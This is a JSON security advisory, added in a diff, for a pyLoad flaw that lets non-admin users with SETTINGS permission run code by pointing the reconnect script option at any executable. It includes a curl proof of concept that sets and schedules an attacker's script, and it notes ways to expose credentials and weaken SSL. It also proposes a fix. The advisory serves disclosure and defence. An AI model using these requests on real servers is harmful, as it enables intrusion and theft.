@@ -1,0 +1,156 @@
+{
+  "id": "GHSA-r7mc-x6x7-cqxx",
+  "modified": "2026-03-27T22:18:37.126073Z",
+  "published": "2026-03-20T21:50:30Z",
+  "aliases": [
+    "CVE-2026-33509"
+  ],
+  "summary": "pyLoad SETTINGS Permission Users Can Achieve Remote Code Execution via Unrestricted Reconnect Script Configuration",
+  "details": "## Summary\n\nThe `set_config_value()` API endpoint allows users with the non-admin `SETTINGS` permission to modify any configuration option without restriction. The `reconnect.script` config option controls a file path that is passed directly to `subprocess.run()` in the thread manager's reconnect logic. A SETTINGS user can set this to any executable file on the system, achieving Remote Code Execution. The only validation in `set_config_value()` is a hardcoded check for `general.storage_folder` — all other security-critical settings including `reconnect.script` are writable without any allowlist or path restriction.\n\n## Details\n\nThe vulnerability chain spans two components:\n\n**1. Unrestricted config write — `src/pyload/core/api/__init__.py:210-243`**\n\n```python\n@permission(Perms.SETTINGS)\n@post\ndef set_config_value(self, category: str, option: str, value: Any, section: str = \"core\") -\u003e None:\n    self.pyload.addon_manager.dispatch_event(\n        \"config_changed\", category, option, value, section\n    )\n    if section == \"core\":\n        if category == \"general\" and option == \"storage_folder\":\n            # Forbid setting the download folder inside dangerous locations\n            # ... validation only for storage_folder ...\n            return\n\n        self.pyload.config.set(category, option, value)  # No validation for any other option\n```\n\nThe `Perms.SETTINGS` permission (value 128) is a non-admin permission flag. The only hardcoded validation is for `general.storage_folder`. The `reconnect.script` option is written directly to config with no path validation, allowlist, or sanitization.\n\n**2. Arbitrary script execution — `src/pyload/core/managers/thread_manager.py:157-199`**\n\n```python\ndef try_reconnect(self):\n    if not (\n        self.pyload.config.get(\"reconnect\", \"enabled\")\n        and self.pyload.api.is_time_reconnect()\n    ):\n        return False\n\n    # ... checks if active downloads want reconnect ...\n\n    reconnect_script = self.pyload.config.get(\"reconnect\", \"script\")\n    if not os.path.isfile(reconnect_script):\n        self.pyload.config.set(\"reconnect\", \"enabled\", False)\n        self.pyload.log.warning(self._(\"Reconnect script not found!\"))\n        return\n\n    # ... reconnect logic ...\n\n    try:\n        subprocess.run(reconnect_script)  # Executes attacker-controlled path\n    except Exception:\n        # ...\n```\n\nThe `reconnect_script` value comes directly from config. The only check is `os.path.isfile()` — the file must exist but there is no allowlist, no path restriction, and no signature verification.\n\n**3. Attacker also controls timing via same SETTINGS permission**\n\nThe attacker can set `reconnect.enabled=True`, `reconnect.start_time`, and `reconnect.end_time` through the same `set_config_value()` endpoint to control when execution occurs. `toggle_reconnect()` at line 321 requires only `Perms.STATUS` — an even lower privilege.\n\n**4. Additional privilege escalation via config access**\n\nBeyond RCE, the same unrestricted config write allows SETTINGS users to:\n- Read proxy credentials (`proxy.username`/`proxy.password`) in plaintext via `get_config()`\n- Redirect syslog to an attacker-controlled server (`log.syslog_host`/`log.syslog_port`)\n- Disable SSL (`webui.use_ssl=False`), rebind to `0.0.0.0` (`webui.host`)\n- Modify SSL certificate/key paths to enable MITM\n\n## PoC\n\n**Step 1: Set reconnect script to an attacker-controlled executable**\n\nVia API:\n```bash\n# Authenticate and get session (as user with SETTINGS permission)\ncurl -c cookies.txt -X POST 'http://target:8000/api/login' \\\n  -d 'username=settingsuser\u0026password=pass123'\n\n# Set reconnect script to a known executable on the system\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect\u0026option=script\u0026value=/tmp/exploit.sh\u0026section=core'\n```\n\nVia Web UI:\n```bash\ncurl -b cookies.txt -X POST 'http://target:8000/json/save_config?category=core' \\\n  -d 'reconnect|script=/tmp/exploit.sh\u0026reconnect|enabled=True'\n```\n\n**Step 2: Enable reconnect and set timing window**\n\n```bash\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect\u0026option=enabled\u0026value=True\u0026section=core'\n\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect\u0026option=start_time\u0026value=00:00\u0026section=core'\n\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect\u0026option=end_time\u0026value=23:59\u0026section=core'\n```\n\n**Step 3: Script executes when thread manager calls `try_reconnect()`**\n\nThe thread manager's `run()` method (called repeatedly by the core loop) invokes `try_reconnect()`, which calls `subprocess.run(reconnect_script)` at `thread_manager.py:199`.\n\n**Note on exploitation constraints:** The file at the target path must exist (`os.path.isfile()` check) and be executable. With `shell=False` (subprocess.run default), no arguments are passed. If the attacker also has `ADD` permission (common for non-admin users), they can use pyLoad to download an archive containing an executable script, which may retain execute permissions after extraction.\n\n## Impact\n\n- **Remote Code Execution**: A non-admin user with SETTINGS permission can execute arbitrary programs on the server as the pyLoad process user\n- **Privilege escalation**: The SETTINGS permission is described as \"can access settings\" — granting it is not expected to grant arbitrary code execution capability\n- **Credential exposure**: SETTINGS users can read proxy credentials, SSL key paths, and other sensitive config values via `get_config()`\n- **Network reconfiguration**: SETTINGS users can disable SSL, change bind address, redirect logging, and modify other security-critical network settings\n\n## Recommended Fix\n\nAdd an allowlist or category-level restriction in `set_config_value()` that prevents non-admin users from modifying security-critical options:\n\n```python\n# In set_config_value(), after the storage_folder check:\nADMIN_ONLY_OPTIONS = {\n    (\"reconnect\", \"script\"),\n    (\"webui\", \"host\"),\n    (\"webui\", \"use_ssl\"),\n    (\"webui\", \"ssl_cert\"),\n    (\"webui\", \"ssl_key\"),\n    (\"log\", \"syslog_host\"),\n    (\"log\", \"syslog_port\"),\n    (\"proxy\", \"username\"),\n    (\"proxy\", \"password\"),\n}\n\nif section == \"core\" and (category, option) in ADMIN_ONLY_OPTIONS:\n    # Require ADMIN role for security-critical settings\n    if not self.pyload.api.user_data.get(\"role\") == Role.ADMIN:\n        raise PermissionError(f\"Admin role required to modify {category}.{option}\")\n```\n\nAdditionally, consider validating the `reconnect.script` path against an allowlist of directories or requiring admin approval for script path changes.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pyload-ng",
+        "purl": "pkg:pypi/pyload-ng"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.4.0"
+            },
+            {
+              "last_affected": "0.5.0b3.dev96"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.5.0a5.dev528",
+        "0.5.0a5.dev532",
+        "0.5.0a5.dev535",
+        "0.5.0a5.dev536",
+        "0.5.0a5.dev537",
+        "0.5.0a5.dev539",
+        "0.5.0a5.dev540",
+        "0.5.0a5.dev545",
+        "0.5.0a5.dev562",
+        "0.5.0a5.dev564",
+        "0.5.0a5.dev565",
+        "0.5.0a6.dev570",
+        "0.5.0a6.dev578",
+        "0.5.0a6.dev587",
+        "0.5.0a7.dev596",
+        "0.5.0a8.dev602",
+        "0.5.0a9.dev615",
+        "0.5.0a9.dev629",
+        "0.5.0a9.dev632",
+        "0.5.0a9.dev641",
+        "0.5.0a9.dev643",
+        "0.5.0a9.dev655",
+        "0.5.0a9.dev806",
+        "0.5.0b1.dev1",
+        "0.5.0b1.dev2",
+        "0.5.0b1.dev3",
+        "0.5.0b1.dev4",
+        "0.5.0b1.dev5",
+        "0.5.0b2.dev10",
+        "0.5.0b2.dev11",
+        "0.5.0b2.dev12",
+        "0.5.0b2.dev9",
+        "0.5.0b3.dev13",
+        "0.5.0b3.dev14",
+        "0.5.0b3.dev17",
+        "0.5.0b3.dev18",
+        "0.5.0b3.dev19",
+        "0.5.0b3.dev20",
+        "0.5.0b3.dev21",
+        "0.5.0b3.dev22",
+        "0.5.0b3.dev24",
+        "0.5.0b3.dev26",
+        "0.5.0b3.dev27",
+        "0.5.0b3.dev28",
+        "0.5.0b3.dev29",
+        "0.5.0b3.dev30",
+        "0.5.0b3.dev31",
+        "0.5.0b3.dev32",
+        "0.5.0b3.dev33",
+        "0.5.0b3.dev34",
+        "0.5.0b3.dev35",
+        "0.5.0b3.dev38",
+        "0.5.0b3.dev39",
+        "0.5.0b3.dev40",
+        "0.5.0b3.dev41",
+        "0.5.0b3.dev42",
+        "0.5.0b3.dev43",
+        "0.5.0b3.dev44",
+        "0.5.0b3.dev45",
+        "0.5.0b3.dev46",
+        "0.5.0b3.dev47",
+        "0.5.0b3.dev48",
+        "0.5.0b3.dev49",
+        "0.5.0b3.dev50",
+        "0.5.0b3.dev51",
+        "0.5.0b3.dev52",
+        "0.5.0b3.dev53",
+        "0.5.0b3.dev54",
+        "0.5.0b3.dev57",
+        "0.5.0b3.dev60",
+        "0.5.0b3.dev62",
+        "0.5.0b3.dev64",
+        "0.5.0b3.dev65",
+        "0.5.0b3.dev66",
+        "0.5.0b3.dev67",
+        "0.5.0b3.dev68",
+        "0.5.0b3.dev69",
+        "0.5.0b3.dev70",
+        "0.5.0b3.dev71",
+        "0.5.0b3.dev72",
+        "0.5.0b3.dev73",
+        "0.5.0b3.dev74",
+        "0.5.0b3.dev75",
+        "0.5.0b3.dev76",
+        "0.5.0b3.dev77",
+        "0.5.0b3.dev78",
+        "0.5.0b3.dev79",
+        "0.5.0b3.dev80",
+        "0.5.0b3.dev81",
+        "0.5.0b3.dev82",
+        "0.5.0b3.dev85",
+        "0.5.0b3.dev87",
+        "0.5.0b3.dev88",
+        "0.5.0b3.dev89",
+        "0.5.0b3.dev90",
+        "0.5.0b3.dev91",
+        "0.5.0b3.dev92",
+        "0.5.0b3.dev93",
+        "0.5.0b3.dev94",
+        "0.5.0b3.dev95",
+        "0.5.0b3.dev96"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-r7mc-x6x7-cqxx/GHSA-r7mc-x6x7-cqxx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33509"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pyload/pyload/commit/f5e284fcdfeaf08436bb03e5fcf697aaac659d8b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pyload/pyload"
+    }
+  ]
+}
